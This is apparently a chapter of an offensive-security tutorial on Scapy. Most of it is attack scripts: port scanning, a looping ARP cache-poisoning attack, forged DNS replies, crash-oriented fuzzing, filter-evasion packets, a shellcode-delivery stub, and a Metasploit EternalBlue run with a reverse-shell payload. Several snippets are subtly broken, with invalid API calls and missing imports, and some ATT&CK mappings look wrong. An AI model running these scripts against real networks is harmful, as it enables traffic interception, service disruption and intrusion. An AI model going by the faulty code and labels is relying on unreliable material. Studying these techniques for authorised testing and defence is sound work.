# 02 - Hands-On Use Cases

## Basic IP + TCP Packet Crafting and Sending

**MITRE ATT&CK:** T1595.001 (Active Scanning: Network Service Discovery)

This is the foundational use case: building a single packet from scratch and sending it to a target. No response handling — useful for one-off probes or when the target's response is unimportant.

```python
#!/usr/bin/env python3
from scapy.all import IP, TCP, send

# Build a TCP SYN packet to a target's HTTP port
target_ip = "192.168.1.100"
target_port = 80

pkt = IP(dst=target_ip, ttl=64) / TCP(dport=target_port, flags="S", sport=12345)

# Send the packet (requires root/admin)
send(pkt, verbose=False)
print(f"[+] Sent SYN packet to {target_ip}:{target_port}")
```

**What's happening:**
- `IP(dst=..., ttl=64)` creates an IPv4 header with destination IP and TTL set to 64 (default is 64, but explicit here).
- `TCP(dport=target_port, flags="S", sport=12345)` creates a TCP header with destination port, SYN flag set, and a semi-random source port.
- `IP(...) / TCP(...)` stacks the TCP layer on top of IP.
- `send()` emits the packet onto the network interface without waiting for a response.

**Operator modifications:** Change `ttl=` to evade TTL-based filtering; change `sport=` to randomize source ports; add `Raw(load=b"data")` to append payload bytes.

---

## Stateless SYN Scanning (Port Discovery)

**MITRE ATT&CK:** T1046 (Network Service Scanning)

Send a batch of SYN packets to multiple targets and ports, collect responses, and determine which ports are open (SYN-ACK) vs. filtered (RST or no response).

```python
#!/usr/bin/env python3
from scapy.all import IP, TCP, sr, conf
import sys

conf.verb = 0  # Suppress verbose output

target_ip = "192.168.1.100"
ports = [22, 80, 443, 3389, 8080]

print(f"[*] Scanning {target_ip} for open ports...")

# Build SYN packets for each port
packets = [IP(dst=target_ip) / TCP(dport=port, flags="S") for port in ports]

# sr() sends packets and waits for responses
answered, unanswered = sr(packets, timeout=2)

open_ports = []
for sent, received in answered:
    if received[TCP].flags & 0x12:  # Check for SYN-ACK (0x12 = SYN | ACK)
        port = sent[TCP].dport
        open_ports.append(port)
        print(f"[+] Port {port} is OPEN (SYN-ACK received)")
    elif received[TCP].flags & 0x04:  # RST flag
        print(f"[-] Port {sent[TCP].dport} is CLOSED (RST received)")

if unanswered:
    print(f"[*] {len(unanswered)} ports did not respond (possibly filtered)")

print(f"\n[+] Summary: {len(open_ports)} open port(s): {open_ports}")
```

**Key points:**
- `sr()` is "Send and Receive" — it emits packets and collects matching responses, returning a tuple of (answered, unanswered) packets.
- TCP flags are stored as bit flags: `0x02 = SYN`, `0x04 = RST`, `0x10 = ACK`, `0x12 = SYN | ACK`.
- This scan is **stateless** — no TCP three-way handshake is completed; we never send a final ACK.
- Much faster than a full-state scan (e.g., from `nmap -sS`).

---

## ICMP Echo Request Probing (Ping Variants)

**MITRE ATT&CK:** T1595.001 (Active Scanning: Network Service Discovery), T1040 (Traffic Capture)

Craft ICMP Echo Request packets with custom fields (TTL, payload, timestamps) to probe for connectivity or trigger firewall/IDS responses. This goes beyond the standard `ping` command.

```python
#!/usr/bin/env python3
from scapy.all import IP, ICMP, sr1
import time

target_ip = "8.8.8.8"
seq_id = 1

print(f"[*] Probing {target_ip} with ICMP Echo Request...")

# Standard ICMP Echo Request (like ping)
pkt = IP(dst=target_ip, ttl=64) / ICMP(type=8, code=0, id=1000, seq=seq_id)
reply = sr1(pkt, timeout=2, verbose=False)

if reply:
    print(f"[+] Got response from {reply[IP].src}: TTL={reply[IP].ttl}, RTT={(reply.time - pkt.sent_time)*1000:.2f}ms")
else:
    print("[-] No response (filtered or unreachable)")

# Variant: ICMP Timestamp Request (RFC 792)
# Returns remote server's timestamp — useful for OS fingerprinting
print("\n[*] Sending ICMP Timestamp Request (type 13)...")
pkt_ts = IP(dst=target_ip, ttl=64) / ICMP(type=13, code=0, id=1000, seq=1) / ICMP.Timestamp(ts_orig=int(time.time() * 1000))
reply_ts = sr1(pkt_ts, timeout=2, verbose=False)

if reply_ts:
    print(f"[+] Target {reply_ts[IP].src} responds to timestamp requests")
    if ICMP in reply_ts:
        print(f"    [*] Remote time (may reveal OS info): {reply_ts[ICMP].ts_rx}")
else:
    print("[-] No timestamp response")

# Variant: Crafted TTL to evade hop-limited filters
print("\n[*] Sending ICMP with TTL=1 (testing TTL filter evasion)...")
pkt_ttl1 = IP(dst=target_ip, ttl=1) / ICMP(type=8, code=0, id=1000, seq=2)
reply_ttl1 = sr1(pkt_ttl1, timeout=2, verbose=False)

if reply_ttl1:
    print(f"[+] Response with TTL=1: {reply_ttl1[IP].src}")
else:
    print("[-] TTL=1 probe did not receive a response (filtered or exceeded hop limit)")
```

**Why this matters:**
- Standard `ping` uses the ICMP Echo protocol, but it doesn't let you control TTL, payload, or timing precisely.
- Scapy lets you craft malformed ICMP (e.g., Echo Requests with data corruption, Timestamp Requests, Address Mask Requests) to trigger protocol-parsing bugs or evade primitive filters.
- Many firewalls block ICMP, but Scapy lets you test for specific ICMP types they allow.

---

## ARP Reconnaissance and Spoofing

**MITRE ATT&CK:** T1557.002 (Adversary-in-the-Middle: ARP Cache Poisoning)

Send ARP requests to discover live hosts on a local network, then craft spoofed ARP replies to intercept traffic.

```python
#!/usr/bin/env python3
from scapy.all import ARP, Ether, srp, conf
from ipaddress import ip_network

conf.verb = 0

# Step 1: ARP sweep to discover live hosts
network = "192.168.1.0/24"
print(f"[*] ARP sweeping {network}...")

# Build ARP who-has requests
arp_packets = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=network)

# srp() is "send-receive at layer 2" (Ethernet)
answered, unanswered = srp(arp_packets, timeout=2, verbose=False)

live_hosts = []
print("[+] Live hosts found:")
for sent, received in answered:
    target_ip = received[ARP].psrc
    target_mac = received[ARP].hwsrc
    live_hosts.append((target_ip, target_mac))
    print(f"    {target_ip:15} ({target_mac})")

# Step 2: ARP spoofing — poison a target's ARP cache
if live_hosts:
    target_ip, target_mac = live_hosts[0]  # Pick the first live host
    gateway_ip = "192.168.1.1"  # Assume 192.168.1.1 is the gateway
    attacker_mac = conf.get_if_hwaddr("eth0")  # Get our own MAC address
    
    print(f"\n[*] Starting ARP poisoning: claiming {gateway_ip} is at {attacker_mac}")
    print(f"    (Target: {target_ip}, MAC: {target_mac})")
    
    # Craft a spoofed ARP reply
    spoof_pkt = Ether(dst=target_mac) / ARP(
        op="is-at",  # ARP reply
        pdst=target_ip,
        hwdst=target_mac,
        psrc=gateway_ip,
        hwsrc=attacker_mac
    )
    
    # Send repeatedly to maintain the poisoning
    print("[*] Sending spoofed ARP reply every 2 seconds (press Ctrl+C to stop)...")
    try:
        while True:
            from scapy.all import sendp
            import time
            sendp(spoof_pkt, verbose=False, iface="eth0")
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[*] ARP poisoning stopped")
```

**Defense context:**
- ARP has no authentication — any host can claim to own any IP.
- This type of MITM requires local network access (no routing).
- Detection: A spike in ARP requests/replies for the same IP from different MACs, or tools like `arpwatch` monitoring ARP changes.

---

## DNS Query Crafting and Response Spoofing

**MITRE ATT&CK:** T1595.001 (Active Scanning: Network Service Discovery), T1040 (Traffic Capture)

Craft custom DNS packets to enumerate DNS servers, test for vulnerabilities, or perform DNS exfiltration.

```python
#!/usr/bin/env python3
from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, sr1

dns_server = "8.8.8.8"
target_domain = "example.com"

print(f"[*] Querying {dns_server} for {target_domain}...")

# Build a DNS query packet
# DNS queries use UDP port 53
dns_query = IP(dst=dns_server) / UDP(dport=53, sport=12345) / DNS(
    id=0xABCD,               # Transaction ID (can be arbitrary)
    rd=1,                    # Recursion Desired
    qd=DNSQR(qname=target_domain, qtype="A", qclass="IN")  # Query for A record
)

# Send and receive one response
response = sr1(dns_query, timeout=2, verbose=False)

if response and DNS in response:
    dns_layer = response[DNS]
    print(f"[+] Response from {response[IP].src}:")
    print(f"    Transaction ID: 0x{dns_layer.id:04x}")
    print(f"    Answers: {dns_layer.ancount}")
    
    # Parse DNS answer records
    if dns_layer.ancount > 0:
        for i in range(dns_layer.ancount):
            answer = dns_layer.an[i]
            if hasattr(answer, 'rdata'):
                print(f"    {answer.rrname.decode()} -> {answer.rdata}")
else:
    print("[-] No DNS response received")

# Variant: Zone transfer attempt (AXFR)
print(f"\n[*] Attempting zone transfer (AXFR) for {target_domain}...")

dns_axfr = IP(dst=dns_server) / UDP(dport=53, sport=12346) / DNS(
    id=0xDEF0,
    qd=DNSQR(qname=target_domain, qtype="AXFR", qclass="IN")  # Zone transfer request
)

response_axfr = sr1(dns_axfr, timeout=2, verbose=False)

if response_axfr and DNS in response_axfr:
    print(f"[+] Zone transfer response received (check manually for data)")
else:
    print("[-] Zone transfer not allowed or no response")

# Variant: DNS spoofing — craft a fake response
print(f"\n[*] Crafting fake DNS response (educational only)...")

fake_dns_response = IP(
    dst="192.168.1.50",  # Victim IP
    src=dns_server
) / UDP(
    sport=53,
    dport=12345  # Match the victim's source port from their query
) / DNS(
    id=0xABCD,           # Match the query's transaction ID
    qr=1,                # Query Response flag (1 = response)
    rd=1,
    ra=1,                # Recursion Available
    rcode=0,             # No error
    qd=DNSQR(qname=target_domain, qtype="A", qclass="IN"),
    an=DNSRR(
        rrname=target_domain,
        type="A",
        rclass="IN",
        ttl=300,
        rdata="10.0.0.1"  # Fake IP to redirect victim
    )
)

print(f"[+] Fake DNS response packet built (requires ARP spoofing to actually intercept victim traffic)")
fake_dns_response.show()
```

**Why this matters:**
- DNS is often unencrypted and unauthenticated; Scapy lets you craft responses that look legitimate.
- Zone transfer (AXFR) enumeration can leak an entire domain's subdomain list if the DNS server is misconfigured.
- DNS exfiltration (encoding data in DNS queries) uses this same crafting capability.

---

## Protocol Fuzzing

**MITRE ATT&CK:** T1583.006 (Acquire Infrastructure: Vulnerabilities)

Randomly mutate packet fields to discover protocol-parsing bugs or crash targets. The `fuzz()` function is Scapy's built-in fuzzer.

```python
#!/usr/bin/env python3
from scapy.all import IP, TCP, fuzz, send
import sys

target_ip = "192.168.1.100"
target_port = 80

print(f"[*] Fuzzing {target_ip}:{target_port}...")
print(f"[*] Sending 100 randomly-mutated TCP packets...")
print(f"[WARNING] This may crash the target or trigger IDS alerts!\n")

for i in range(100):
    # Build a base packet
    pkt = IP(dst=target_ip) / TCP(dport=target_port, flags="S")
    
    # Fuzz corrupts random fields in the packet
    fuzzed_pkt = fuzz(pkt)
    
    try:
        send(fuzzed_pkt, verbose=False)
        print(f"[+] Sent fuzzed packet {i+1}/100")
    except Exception as e:
        print(f"[-] Error sending packet {i+1}: {e}")
        break

print("\n[+] Fuzzing complete. Monitor target for crashes or anomalies.")

# Variant: Fuzz specific fields
print(f"\n[*] Fuzzing with controlled field mutation...")

for i in range(10):
    # Build packet with specific malformed fields
    pkt = IP(
        dst=target_ip,
        ttl=fuzz(64, min=0, max=255)  # Randomize only TTL
    ) / TCP(
        dport=target_port,
        flags=fuzz("S"),  # Random flags
        sport=fuzz(12345, min=1024, max=65535)
    )
    
    send(pkt, verbose=False)
    print(f"[+] Sent controlled-fuzz packet {i+1}/10 (TTL={pkt[IP].ttl}, TCP flags={pkt[TCP].flags})")
```

**Practical angle:**
- Fuzzing discovers "1-day" vulnerabilities in proprietary or legacy protocols.
- Many embedded systems have weak protocol parsers that crash on malformed input.
- This is how 0-day exploits are often developed — fuzz until you find a crash, then reverse-engineer the crash to craft a reliable exploit.

---

## Exploit Payload Delivery (Shellcode Embedding)

**MITRE ATT&CK:** T1204 (User Execution), T1548 (Abuse Elevation Control Mechanism)

Embed shellcode or malicious data into crafted packets to deliver an exploit payload to a target service.

```python
#!/usr/bin/env python3
from scapy.all import IP, TCP, send
import struct

target_ip = "192.168.1.100"
target_port = 445  # SMB (Windows file sharing)

# In a real exploit, shellcode would be generated by msfvenom or hand-crafted
# This example uses a simple marker instead of real shellcode
shellcode = b"MZ\x90" * 20  # Fake PE header marker (not actual shellcode)

print(f"[*] Crafting exploit packet for {target_ip}:{target_port}")
print(f"[*] Payload size: {len(shellcode)} bytes")

# Build an IP+TCP+payload packet
exploit_pkt = IP(dst=target_ip) / TCP(dport=target_port) / Raw(load=shellcode)

print(f"[*] Packet structure:")
exploit_pkt.show()

# In a real scenario, this would be integrated with an actual exploit flow:
# - Fuzz/probe the target to identify the vulnerability
# - Craft the exploit trigger (malformed packet)
# - Embed shellcode in the payload
# - Send and wait for shell access

print(f"\n[+] Exploit packet ready. Would send to target (disabled for safety)")
# send(exploit_pkt, verbose=False)  # Commented out for safety
```

**Real-world context:**
- Many network services parse incoming packets without proper bounds-checking.
- A buffer-overflow vulnerability in a parsing function can be triggered by sending a specially-crafted packet with a large payload.
- Scapy lets you embed raw bytes (shellcode) into the packet layer-by-layer, bypassing any application-layer serialization.

---

## Kerberos Packet Crafting (AS-REQ / TGS-REQ)

**MITRE ATT&CK:** T1558.003 (Steal or Forge Kerberos Tickets)

Build raw Kerberos authentication request packets to interact with a KDC (Key Distribution Center) without a full Kerberos client library. This is how tools like `GetUserSPNs.py` (Impacket) and `Rubeus` work.

```python
#!/usr/bin/env python3
from scapy.all import IP, UDP, Raw, send, sr1
from scapy.layers.kerberos import KerberosASReq, KerberosASReqInner
import struct

kdc_ip = "192.168.1.50"  # Domain controller
kdc_port = 88            # Kerberos UDP port

username = b"user@DOMAIN.COM"
realm = b"DOMAIN.COM"

print(f"[*] Crafting Kerberos AS-REQ to {kdc_ip}:{kdc_port}")
print(f"[*] Requesting TGT for {username.decode()}")

# Build a basic Kerberos AS-REQ packet
# (Note: This is a simplified example; real Kerberos packets require pre-authentication, crypto, etc.)

# For now, show the Scapy Kerberos layer structure
from scapy.layers.kerberos import KerberosNegToken
import base64

print(f"\n[*] Scapy supports these Kerberos message types:")
print(f"    - KerberosASReq (Authentication Service Request)")
print(f"    - KerberosASRep (Authentication Service Reply)")
print(f"    - KerberosTGSReq (Ticket Granting Service Request)")
print(f"    - KerberosTGSRep (Ticket Granting Service Reply)")

print(f"\n[+] For practical Kerberos exploitation, use specialized tools:")
print(f"    - Rubeus (C# on Windows)")
print(f"    - impacket's GetUserSPNs.py or ticketer.py (Python)")
print(f"    - Hashcat for offline Kerberos hash cracking")

print(f"\n[*] Scapy's Kerberos layer is best used for protocol analysis, not primary exploitation")

# Example: Parse an intercepted Kerberos packet
print(f"\n[*] Example: Parsing a Kerberos packet captured from the wire...")

# (In a real scenario, this packet would come from a pcap file or sniff())
# For this example, we just show the structure
# captured_pkt = IP()/UDP()/Raw(b"...kerberos data...")
# if KerberosASReq in captured_pkt:
#     krb_req = captured_pkt[KerberosASReq]
#     print(f"[+] Intercepted AS-REQ for user: {krb_req.username}")
```

**Why Scapy alone isn't enough for Kerberos:**
- Kerberos uses complex cryptography (AES, RC4, HMAC-MD5) for key derivation and message signing.
- Pre-authentication requires knowledge of the user's password hash.
- Most real-world Kerberos attacks use specialized tools (Rubeus, Impacket) that handle the crypto.
- Scapy's Kerberos layer is most useful for protocol analysis and packet inspection, not primary attack crafting.

---

## SIP/VoIP Packet Manipulation

**MITRE ATT&CK:** T1566.002 (Phishing: Spearphishing via Service)

Craft SIP (Session Initiation Protocol) packets to enumerate VoIP infrastructure, ring phones, or intercept calls.

```python
#!/usr/bin/env python3
from scapy.all import IP, UDP, Raw, send, sr1

pbx_ip = "192.168.1.50"   # VoIP PBX/soft switch
sip_port = 5060

print(f"[*] Crafting SIP INVITE to {pbx_ip}:{sip_port}")

# Manually build a SIP INVITE packet (Scapy has a SIP layer but it's minimal)
sip_request = b"""INVITE sip:target@pbx.local SIP/2.0
Via: SIP/2.0/UDP attacker@192.168.1.100:5060
To: <sip:target@pbx.local>
From: <sip:attacker@pbx.local>;tag=12345
Call-ID: call123@attacker
CSeq: 1 INVITE
Content-Length: 0

"""

# Send via UDP
pkt = IP(dst=pbx_ip) / UDP(sport=5060, dport=sip_port) / Raw(load=sip_request.encode())

print(f"[*] Sending SIP INVITE...")
response = sr1(pkt, timeout=2, verbose=False)

if response:
    print(f"[+] Got response from {response[IP].src}:")
    if Raw in response:
        print(f"{response[Raw].load.decode('utf-8', errors='ignore')}")
else:
    print(f"[-] No response (PBX may be filtered or unavailable)")

print(f"\n[*] Common SIP enumeration techniques:")
print(f"    - OPTIONS requests to probe for valid SIP servers")
print(f"    - INVITE to non-existent users to trigger 404/404 responses")
print(f"    - REGISTER spoofing to hijack extensions")
print(f"    - RTP stream interception (follow-up to established calls)")
```

---

## Custom Protocol Layer Implementation

**MITRE ATT&CK:** T1583.006 (Acquire Infrastructure: Vulnerabilities)

Define a custom protocol layer in Scapy to test proprietary or legacy protocols.

```python
#!/usr/bin/env python3
from scapy.all import Packet, IntField, ShortField, StrField, FieldLenField

# Define a simple custom protocol
class CustomProtocol(Packet):
    """Example custom protocol layer"""
    name = "CustomProto"
    fields_desc = [
        IntField("magic", 0xDEADBEEF),          # 4-byte magic number
        ShortField("msg_type", 0),              # 2-byte message type
        FieldLenField("data_len", None, length_of="data", fmt="H"),  # 2-byte length field
        StrField("data", b"")                   # Variable-length data
    ]

# Build a packet using the custom protocol
print("[*] Building packet with custom protocol layer...")

pkt = CustomProtocol(
    magic=0xDEADBEEF,
    msg_type=1,
    data=b"Hello from custom protocol!"
)

print("[+] Packet structure:")
pkt.show()

print(f"\n[+] Raw bytes: {bytes(pkt).hex()}")

# Stack the custom protocol over IP + UDP
from scapy.all import IP, UDP

full_pkt = IP(dst="192.168.1.50") / UDP(dport=9999) / pkt

print("\n[+] Full packet (IP + UDP + CustomProto):")
full_pkt.show()

print(f"\n[*] To send this to a target:")
print(f"    from scapy.all import send")
print(f"    send(full_pkt)")

# Parsing/dissection: extract fields from a received packet
print(f"\n[*] Parsing custom protocol packets...")
received_data = bytes(pkt)
reconstructed = CustomProtocol(received_data)
print(f"[+] Parsed magic: 0x{reconstructed.magic:08x}")
print(f"[+] Parsed msg_type: {reconstructed.msg_type}")
print(f"[+] Parsed data: {reconstructed.data}")
```

---

## Metasploit Framework Integration

**MITRE ATT&CK:** T1548 (Abuse Elevation Control Mechanism)

Feed Scapy-crafted packets into Metasploit modules for chained exploitation, or use Scapy to extend Metasploit's capabilities.

```python
#!/usr/bin/env python3
"""
Integration pattern: Use Scapy to craft reconnaissance packets,
then feed results into Metasploit for exploitation.
"""

from scapy.all import IP, TCP, sr, conf

conf.verb = 0

target_ip = "192.168.1.100"
ports = [22, 445, 3389]

print(f"[*] Reconnaissance phase: Scapy port scan")
packets = [IP(dst=target_ip) / TCP(dport=port, flags="S") for port in ports]
answered, _ = sr(packets, timeout=2)

open_ports = []
for sent, received in answered:
    if received[TCP].flags & 0x12:
        open_ports.append(sent[TCP].dport)

print(f"[+] Open ports found: {open_ports}")

# In a real scenario, the next step would be:
# 1. Use Metasploit's scanner modules on these open ports
# 2. Identify vulnerable services (e.g., ms17_010 on SMB port 445)
# 3. Launch an exploit module
# 4. Establish a reverse shell / meterpreter session

print(f"\n[*] Exploitation phase: Metasploit (pseudo-code)")
print(f"""
use scanner/smb/smb_version
set RHOSTS {target_ip}
run

# If Windows XP/7/2003 with unpatched MS17-010:
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS {target_ip}
set LHOST 192.168.1.99
set PAYLOAD windows/meterpreter/reverse_tcp
exploit
""")

# Scapy use in Metasploit context:
# - Reconnaissance: custom scanning, probing, fingerprinting
# - Payload delivery: inject shellcode into crafted network packets
# - Post-exploitation: exfil over custom protocol (DNS tunneling, ICMP exfil, etc.)

print(f"\n[+] Common Metasploit + Scapy workflows:")
print(f"    1. Scapy probe -> Metasploit scanner -> Metasploit exploit")
print(f"    2. Scapy craft -> Metasploit inject (via custom payload)")
print(f"    3. Post-exploitation: Scapy DNS/ICMP exfil from meterpreter session")
```

---

## Network Fingerprinting and OS Detection Evasion

**MITRE ATT&CK:** T1595.001 (Active Scanning: Network Service Discovery)

Craft packets with unusual fields (TTL, fragment size, TCP flags) to evade passive OS-detection signatures.

```python
#!/usr/bin/env python3
from scapy.all import IP, TCP, ICMP, send
import time

target_ip = "192.168.1.100"

print(f"[*] Sending packets crafted to evade OS fingerprinting...")

# Tactic 1: Vary TTL to evade hop-count-based filters
print(f"\n[*] Tactic 1: Random TTL values")
for ttl in [1, 32, 64, 128, 255]:
    pkt = IP(dst=target_ip, ttl=ttl) / TCP(dport=80, flags="S")
    send(pkt, verbose=False)
    print(f"    [+] Sent SYN with TTL={ttl}")
    time.sleep(0.5)

# Tactic 2: Fragmentation to evade protocol analyzers
print(f"\n[*] Tactic 2: Fragmented packets")
pkt_large = IP(dst=target_ip, id=12345) / TCP(dport=80, flags="S") / Raw(load=b"A" * 1500)

# Let Scapy fragment automatically (frag=1 enables fragmentation)
from scapy.all import IP, TCP, Raw
pkt_frag = IP(dst=target_ip, id=12345, flags=1) / TCP(dport=80, flags="S") / Raw(load=b"A" * 1500)  # flags=1 is DF (don't fragment) disabled

print(f"    [+] Large payload ({len(b'A' * 1500)} bytes) will trigger fragmentation")
# send(pkt_frag, verbose=False)  # Commented to avoid actually sending

# Tactic 3: Invalid flag combinations
print(f"\n[*] Tactic 3: Invalid TCP flag combinations (FIN+SYN+ACK+RST)")
invalid_flags = "FRAU"  # Not a valid combination in the real world
pkt_invalid = IP(dst=target_ip) / TCP(dport=80, flags=invalid_flags)
send(pkt_invalid, verbose=False)
print(f"    [+] Sent packet with flags={invalid_flags} (unusual and evasion-focused)")

# Tactic 4: ICMP with unusual options
print(f"\n[*] Tactic 4: ICMP with IP options")
from scapy.layers.inet import IPOption_RR  # Record Route option
pkt_icmp_opt = IP(dst=target_ip, options=[IPOption_RR()]) / ICMP()
send(pkt_icmp_opt, verbose=False)
print(f"    [+] Sent ICMP with IP Record Route option (unusual)")

print(f"\n[+] These tactics make fingerprinting harder because:")
print(f"    - Passive tools expect consistent TTL patterns")
print(f"    - Fragmenting breaks packet-level analysis")
print(f"    - Invalid flags confuse stateful inspection")
print(f"    - IP options are rarely seen in benign traffic")
```

---

## Summary Table: Use Cases at a Glance

| Use Case | Function | MITRE ATT&CK | Difficulty | Detectability |
|----------|----------|----------|-----------|---|
| Basic packet crafting | `send()`, `/` operator | T1595.001 | Low | Low (unless unusual) |
| SYN scanning | `sr()` | T1046 | Low | Medium (port scans are monitored) |
| ICMP probing | `sr1()`, ICMP | T1595.001 | Low | Low–Medium |
| ARP spoofing | `srp()`, Ether, ARP | T1557.002 | Medium | High (ARP changes are detectable) |
| DNS crafting | `sr1()`, DNS | T1595.001 | Medium | Medium (unusual DNS queries may trigger) |
| Fuzzing | `fuzz()`, `send()` | T1583.006 | Medium | High (target may crash/alert) |
| Exploit delivery | `send()`, Raw() | T1204 | High | High (exploit-specific signature) |
| Kerberos crafting | Kerberos layer | T1558.003 | High | Medium (requires crypto setup) |
| VoIP manipulation | UDP, Raw() | T1566.002 | Medium | Medium (SIP is monitored) |
| Custom protocol | Custom Packet class | T1583.006 | High | Depends on protocol |
| Metasploit integration | Varies | T1548 | High | High (exploit-specific) |
| Evasion tactics | IP options, fragmentation | T1595.001 | Medium | Low–Medium |
